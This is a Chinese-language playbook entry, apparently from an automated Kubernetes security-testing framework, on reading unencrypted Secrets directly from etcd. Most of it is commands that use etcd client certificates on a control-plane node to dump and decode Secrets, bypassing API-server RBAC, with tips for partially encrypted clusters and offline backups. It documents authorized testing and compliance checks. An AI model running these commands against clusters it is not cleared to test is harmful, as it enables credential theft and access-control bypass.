---
source: manual
confidence: high
platforms: [k8s]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-4.6]
mapped_compliance_families: [etcd加密, 数据保护]
---

# etcd-data-exposure — etcd 未加密静态数据泄露

集群未启用 EncryptionConfiguration 或加密未覆盖 Secret/ConfigMap，攻击者获得 etcd 访问凭证（节点上 etcdctl 客户端证书、etcd 暴露端口、备份介质）后直接从 etcd 读取明文 Secret/ConfigMap，绕过 API Server 鉴权。

---

## 1. 前置条件

- kube-apiserver 未启用 `--encryption-provider-config`，或者 provider 仅 `identity`（未加密）
- 攻击者可访问 etcd：节点 shell + `/etc/kubernetes/pki/etcd/` 客户端证书，或 etcd 端口可达
- etcdctl 客户端可用

检查命令：
```bash
# [L0] 探测：检查 kube-apiserver 启用参数
kubectl get pods -n kube-system -l component=kube-apiserver -o jsonpath='{.items[*].spec.containers[*].command}' | tr ',' '\n' | grep encryption
# 期望输出: 含 --encryption-provider-config（若未输出 → 未启用）

# [L0] 探测：检查 EncryptionConfiguration 内容
ssh <master> -- cat /etc/kubernetes/encryption-config.yaml 2>/dev/null
# 期望输出: resources 含 secrets，providers 含 aescbc/secretbox（否则未加密）
```

## 2. 探测命令

```bash
# [L0] 探测：确认是否启用 encryption-at-rest
kubectl get pods -n kube-system -l component=kube-apiserver -o yaml | grep -A2 encryption-provider
# 期望输出: 无输出 → 未启用静态加密

# [L0] 探测：检查 etcd 客户端证书可用性
ssh <master> -- ls -la /etc/kubernetes/pki/etcd/
# 期望输出: ca.crt / server.crt / healthcheck-client.crt / apiserver-etcd-client.crt

# [L1] 探测：连接 etcd 验证凭证
ssh <master> -- ETCDCTL_API=3 etcdctl --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/apiserver-etcd-client.crt --key=/etc/kubernetes/pki/etcd/apiserver-etcd-client.key endpoint health
# 期望输出: is healthy: successfully
```

## 3. 攻击验证

```bash
# [L1] 攻击验证：直接读取 etcd 中的 Secret 明文
ssh <master> -- ETCDCTL_API=3 etcdctl --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/apiserver-etcd-client.crt --key=/etc/kubernetes/pki/etcd/apiserver-etcd-client.key get /registry/secrets/<ns>/<secret-name> --print-value-only
# 期望输出: 含 type.kubernetes.io/secret 与明文 password 字段

# [L2] 攻击验证：列出全部 Secret 并提取明文
ssh <master> -- ETCDCTL_API=3 etcdctl --cacert=... --cert=... --key=... get /registry/secrets --prefix --keys-only | head
# 期望输出: 所有 Secret 的 etcd key 路径

# [L2] 攻击验证：导出某 Secret 的明文值
ssh <master> -- ETCDCTL_API=3 etcdctl ... get /registry/secrets/kube-system/default-token-abc -w=json | jq -r '.data' | base64 -d
# 期望输出: base64 解码后的明文 Secret 数据
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：通过 API 读取 Secret（受 RBAC 限制）
kubectl get secret -n kube-system 2>&1
# 期望输出: forbidden（当前身份无 RBAC）

# [L0] 攻击后环境对比：通过 etcd 直接读取获取明文
ssh <master> -- etcdctl ... get /registry/secrets/kube-system/<secret> --print-value-only | strings
# 期望输出: 明文 password/token → 证明绕过 API 鉴权
```

差分结论：通过 API Server 因 RBAC 限制无法读取 Secret，但 etcd 未加密静态存储，攻击者用 etcd 客户端证书直接读取明文值，证明 etcd 数据泄露成立。

## 5. 绕过策略

```bash
# [L0] 检查 EncryptionConfiguration 是否启用
kubectl get pods -n kube-system -l component=kube-apiserver -o yaml | grep encryption-provider
# 若无 → 直接明文读取

# 绕过方式：
# - [L2] 若 providers 含 identity 之外的 provider 但目标资源未列入 resources，读取未覆盖资源
# - [L2] 若加密 key 轮换存在旧 v1 key，需解密旧 key 加密的资源可能存在且可读
# - [L1] 若 etcd 客户端证书限制，使用备份 dump（如 etcd snapshot save 备份文件）离线读取
```

## 6. 证伪条件

```bash
# [L0] 已启用静态加密
kubectl get pods -n kube-system -l component=kube-apiserver -o yaml | grep -A2 encryption-provider
# 输出: 含 aescbc/secretbox 且 resources 含 secrets → 证伪

# [L1] 通过 etcd 读取得到密文
ssh <master> -- etcdctl ... get /registry/secrets/<ns>/<name> --print-value-only | xxd | head
# 输出: 不可读的加密字节 → 证伪

# [L1] 无 etcd 客户端证书或凭证
ssh <master> -- ls /etc/kubernetes/pki/etcd/apiserver-etcd-client.crt 2>&1
# 输出: No such file → 证伪
```

## 7. 审批级别

- **L2** 攻击验证（从 etcd 提取明文凭证）→ **Level 4**（绕过 API 鉴权盗窃凭证，需人工确认）
- **L1** 探测命令（etcdctl 连接健康检查）→ **Level 2**（只读探测，自动执行）
- **L0** 观察命令 → **Level 1**（只读侦察，自动执行）
- 破坏性标注：否
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Credential Access
- **Technique ID**: T1552
- **Technique Name**: Unsecured Credentials
- **描述**: 集群未启用 EncryptionConfiguration 或加密未覆盖 Secret，攻击者用 etcd 客户端凭证直接从 etcd 读取明文 Secret，绕过 API Server 鉴权与静态加密保护。